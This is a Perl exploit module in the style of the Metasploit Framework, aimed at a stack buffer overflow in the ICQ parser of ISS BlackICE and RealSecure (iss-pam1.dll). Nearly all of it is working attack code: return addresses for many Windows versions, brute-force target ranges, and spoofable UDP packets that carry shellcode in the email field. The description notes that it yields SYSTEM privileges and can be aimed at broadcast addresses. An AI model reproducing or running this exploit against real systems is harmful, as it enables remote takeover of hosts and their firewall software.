package Msf::Exploit::blackice_pam_icq;
use base 'Msf::Exploit';
use strict;
use Pex::x86;
use Pex::Utils;

my $advanced = {
  'BruteWait'       => [5, 'Time to sleep between attempts, gives the SEH a chance to recover.'],
  'AdvancedTargets' => [0, 'You should never really need this, just figured why not. This won\'t work with brute forcing either.'],
};

my $info =
{
  'Name'  => 'Blackice/RealSecure/Other ISS ICQ Parser Buffer Overflow',
  'Version'  => '$Revision$',
  'Authors' =>
    [
      'spoonm <ninjatools [at] hush.com>',
    ],
  'Description'  => qq{

    This is a bug in the (seemingly unused) ICQ parser in ISS products that use
    iss-pam1.dll.  It is a stack overflow caused by _sprintf()'s based on
    information from a META_USER packet.  This exploit requires only 1 udp packet
    to be sent, no state required.  This means you can spoof, or fire at broadcasts.
    The ISS products seem to have an interesting exception handler installed that
    will recover the process if something bad happens, which gives us the ability
    to not only compromise the process multiple times, but also to brute force.
    !!! winexec payload's will not working, blackd is running as a system service
    and seems to have some problems with winexec that we have yet to figure out !!!
    Oh, and yeah, this gets you SYSTEM.

  },
  
  'Arch'  => [ 'x86' ],
  'OS'    => [ 'win32' ],
  'Priv'  => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port (1 for random)', 1],
    },

  'Payload' =>
    {
      'Space'  => 504 - 31 - 4,
      'BadChars'  => "\x00",
      'MinNops' => 0,
      'MaxNops' => 0,
      'PrependEncoder' => "\x83\xc4\x84", # add esp, BYTE -124
#      'Prepend' => "\xcc",
    },

  'Refs'  => 
    [  
      'http://www.osvdb.org/4355',
      'http://www.eeye.com/html/Research/Advisories/AD20040318.html',
      'http://xforce.iss.net/xforce/alerts/id/166',
    ],
  'DefaultTarget' => -1, # it defaults to this, but set anyway
  'Targets' =>
    [
      [1, 'Brute Force All', 3 .. 12],
      [1, 'Brute Force iss-pam1.dll', 3 .. 4],
      [1, 'Brute Force nt4', 11 .. 12],
      [1, 'iss-pam1.dll 3.6.06', 0x5e0a473f],
#      [1, 'iss-pam1.dll 3.6.06', 0xdeaddead],
#      [1, 'iss-pam1.dll 3.6.06', 0x01a7448f],
      [1, 'iss-pam1.dll 3.6.11', 0x5e0da1db],

      [1, 'WinXP SP0 - SP1', 0x71aa3a4b], # ws2help.dll
      [1, 'Win2k3 SP0', 0x71bf3cc9], # ws2help.dll

#      [1, 'WinXP SP0 / WinXP SP1', 0x76d4f613], # mprapi.dll
#      [1, 'WinXP SP1 / Win2003 SP0', 0x77798428], # shell32.dll

# ey4s rocks, thanks for the ret man!
      [1, 'Win2000 SP0 - SP4', 0x750231e2], # ws2help.dll

#      [1, 'Win2000 SP3 / Win2000 SP4', 0x773f05a7], # atl.dll
#      [1, 'Win2000 SP1 / Win2000 SP2 / Win2000 SP3', 0x778e61a3], # setupapi.dll
#      [1, 'Win2000 SP0 / Win2000 SP1 - activeds.dll', 0x773d0beb], # activeds.dll
      [1, 'WinNT SP3 / WinNT SP5 / WinNT SP6', 0x777e79ab], # samlib.dll
      [1, 'WinNT SP4 / WinNT SP5', 0x7733b8db], # cfgmgr32.dll


# I love opcode db.
 
       [0, 'WinXP SP0 / WinXP SP1 - shell32.dll', 0x776606af], # shell32.dll
#      ['WinXP SP0 / WinXP SP1', 0x77a5b03f], # shell32.dll
#      ['WinXP SP0 / WinXP SP1', 0x77a632b7], # shell32.dll
#      ['WinXP SP0 / WinXP SP1', 0x77a634e7], # shell32.dll
#      ['WinXP SP0 / WinXP SP1', 0x77aae747], # shell32.dll
#      ['WinXP SP0 / WinXP SP1', 0x77ac5040], # shell32.dll
      [0, 'WinXP SP0 / WinXP SP1 - atl.dll', 0x76b305a7], # atl.dll
#      ['WinXP SP0 / WinXP SP1', 0x76b30697], # atl.dll
      [0, 'WinXP SP0 / WinXP SP1 - atl.dll', 0x76e61a21], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61cd2], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61cd6], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61cda], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61cde], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61ce2], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61ce6], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61cea], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61cee], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61cf2], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61cf6], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e61cfa], # activeds.dll
#      ['WinXP SP0 / WinXP SP1', 0x76e62e4f], # activeds.dll
      [0, 'WinXP SP0 / WinXP SP1 - ws2_32.dll', 0x71ab7bfb], # ws2_32.dll
#      ['WinXP SP0 / WinXP SP1', 0x71ab1d54], # ws2_32.dll
      [0, 'WinXP SP0 / WinXP SP1 - mswsock.dll', 0x71a5403d], # mswsock.dll
#      ['WinXP SP0 / WinXP SP1', 0x71a74267], # mswsock.dll


#      ['Win2000 SP3 / Win2000 SP4', 0x773f0697], # atl.dll
      [0, 'Win2000 SP2 / Win2000 SP3 - samlib.dll', 0x75159da3], # samlib.dll
      [0, 'Win2000 SP0 / Win2000 SP1 - activeds.dll', 0x773d0beb], # activeds.dll
#      ['Win2000 SP0 / Win2000 SP1 / Win2000 SP2', 0x773ee697], # atl.dll


      [0, 'WinNT SP5 / WinNT SP6 - advapi32.dll', 0x77dcd1cb], # advapi32.dll
#      ['WinNT SP3 / WinNT SP4 / WinNT SP5 / WinNT SP6', 0x77a094c5], # msvcrt.dll
#      ['WinNT SP3 / WinNT SP4 / WinNT SP5 / WinNT SP6', 0x77a0fbde], # msvcrt.dll
#      ['WinNT SP3 / WinNT SP4 / WinNT SP5 / WinNT SP6', 0x77a0fe20], # msvcrt.dll
#      ['WinNT SP3 / WinNT SP4 / WinNT SP5 / WinNT SP6', 0x77a0ff10], # msvcrt.dll
#      ['WinNT SP3 / WinNT SP4 / WinNT SP5 / WinNT SP6', 0x77a1017a], # msvcrt.dll
      [0, 'WinNT SP3 / WinNT SP5 / WinNT SP6 - shell32.dll', 0x77cec080], # shell32.dll
#      ['WinNT SP3 / WinNT SP5 / WinNT SP6', 0x77cecfe0], # shell32.dll
#      ['WinNT SP3 / WinNT SP5 / WinNT SP6', 0x74e9d95b], # setupapi.dll
#      ['WinNT SP4 / WinNT SP5 / WinNT SP6', 0x779f9a39], # msvcrt.dll
#      ['WinNT SP4 / WinNT SP5 / WinNT SP6', 0x77a04c86], # msvcrt.dll

#      ['WinNT SP5 / WinNT SP6', 0x77e5a809], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a80d], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a811], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a815], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a819], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a81d], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a821], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a825], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a829], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a82d], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a831], # rpcrt4.dll
#      ['WinNT SP5 / WinNT SP6', 0x77e5a835], # rpcrt4.dll
      [0, 'WinNT SP5 / WinNT SP6 - mswsock.dll', 0x7767ebca], # mswsock.dll
    ],
};

# Override to do our advanced target foo
sub Targets {
  my $self = shift;
  my $targets = $self->SUPER::Targets;
  my $newTargets = [ ];
  my $advanced = !$self->GetLocal('AdvancedTargets') == 1;

  foreach my $target (@{$targets}) {
    if($target->[0] >= $advanced) {
      my @target = @{$target};
      shift(@target);
      push(@{$newTargets}, \@target);
    }
  }
  return($newTargets);
}

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


sub Exploit {
  my $self = shift;
  my $targetHost  = $self->GetVar('RHOST');
  my $targetIndex = $self->GetVar('TARGET');
  my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

  # Pad shellcode to size
  $shellcode .= Pex::Utils::EnglishText($self->PayloadSpace - length($shellcode));

  my $target = $self->Targets->[$targetIndex];

  $self->PrintLine;
  $self->PrintLine('[*] !!! Note: The connection will not close after shellcode is finished');
  $self->PrintLine('              (atleast when using SEH).  This is because the SEH handler');
  $self->PrintLine('              recovers after bad exceptions (good for us).');
  $self->PrintLine;


  my @targets;

  if(@{$target} == 2) {
    @targets = ($targetIndex);
  }
  else {
    @targets = @{$target};
    my $name = shift(@targets);
    $self->PrintLine('[*] Trying Multiple Targets - ' . $name);
  }

  foreach $targetIndex (@targets) {
    my $target = $self->Targets->[$targetIndex];
    my $addr = $target->[1];

    $self->PrintLine(sprintf('[*] Trying %s - 0x%08x', $target->[0], $addr));

    my $sock = Msf::Socket->new;
    my $port = $self->_targetPort;
    if(!$sock->Udp($targetHost, $port, 4000) || $sock->IsError) {
      $sock->PrintError;
      return;
    }
  
    # http://www.cs.berkeley.edu/~mikechen/im/protocols/icq/icqv5.html
    # ISS's parser disagrees with both the above protocol and ethereal's disector
    my $request =
      "\x05\x00".           # Version 5
      "\x00".               # Unknown
      "\x00\x00\x00\x00".   # Session ID
      "\x12\x02".           # Command SRV_MULTI
      "\x00\x00".           # Seq Num 1
      "\x00\x00".           # Seq Num 2
      "\x00\x00\x00\x00".   # UIN
      "\x00\x00\x00\x00";   # Checkcode (I doubt this even has to be valid)
  
    # Packet 1 USER_ONLINE
    my $packet1 =
      "\x05\x00".           # Version 5
      "\x00".               # Unknown
      "\x00\x00\x00\x00".   # Session ID
      "\x6e\x00".           # Command SRV_USER_ONLINE
      "\x00\x00".           # Seq Num 1
      "\x00\x00".           # Seq Num 2
      "\x00\x00\x00\x00".   # UIN
      "\x00\x00\x00\x00".   # Checkcode
  
      "\x12\x23\x34\x45".   # UIN of user online
      "\x01\x00\x00\x00".   # IP
      "\x00\x00\x00\x00".   # PORT
      "\x00\x00\x00\x00".   # REAL_IP
      "\x00".               # Whatever
      "\x00\x00\x00\x00".   # Online Status
      "\x00\x00\x00\x00";   # Dunno (test) witty did it.
  #    "\x00\x00\x00\x00";   # Dunno
  #    "\x00\x00\x00\x00".   # Dunno
  #    "\x00\x00\x00\x00".   # Dunno
  #    "\x00\x00\x00\x00".   # Dunno
  #    "\x00\x00\x00\x00".   # Dunno
  #    "\x00\x00\x00\x00";   # Dunno
        "";
  
    my $nick = '';
    my $firstName = '';
    my $lastName = '';
  
#    my $email = 'A' x 19;
    my $email = Pex::Utils::EnglishText(19);
    $email .= pack('V', $addr); #arg
    $email .= $shellcode;
  
    # Packet 2 META_USER
    my $packet2 =
      "\x05\x00".           # Version 5
      "\x00".               # Unknown
      "\x00\x00\x00\x00".   # Session ID
      "\xde\x03".           # Command SRV_META_USER
      "\x00\x00".           # Seq Num 1
      "\x00\x00".           # Seq Num 2
  # arg
      "\x12\x34\x56\x78".   # UIN
      "\x00\x00\x00\x00".   # Checkcode
      "\x00\x00".           # Subcommand META_USER_FOUND
      "\x0A".               # Success
  
  # Yeah, so the specs and ISS parser differ, I think this should be here
  # but ISS parser doesn't expect it.
  #    "\x00\x00\x00\x00".                      # UIN
  
      Pex::x86::numberPack16(length($nick)).        # Nick Length
      $nick.
      Pex::x86::numberPack16(length($firstName)).   # First Name Length
      $firstName.
      Pex::x86::numberPack16(length($lastName)).    # Last Name Length
      $lastName.
      Pex::x86::numberPack16(length($email)).       # Email Length
      $email.
      "\x00".                                  # Authorize (don't ask permission, docs and ethereal conflict)
      "\x00\x00".                              # Whatever
      "\x00\x00\x00\x00";                      # Whatever
  
    # Multi
    $request .=
      "\x02".                               # Number of packets
      Pex::x86::numberPack16(length($packet1)).  # Size of first packet
      $packet1.
      Pex::x86::numberPack16(length($packet2)).  # Size of second packet
      $packet2;


    $self->PrintLine('[*] Sending UDP Request (Dest Port: ' . $port . ') (' . length($request) . ' bytes)');
  
    $sock->Send($request);

    $self->PrintLine('[*] Sleeping (giving exception handle time to recover).');
    sleep($self->GetLocal('BruteWait'));
  }

}

sub _targetPort {
  my $self = shift;
  my $targetPort  = $self->GetVar('RPORT');
  return($targetPort) if($targetPort != 1);
  return(int(rand(65536 - 2000)) + 2000);
}

1;
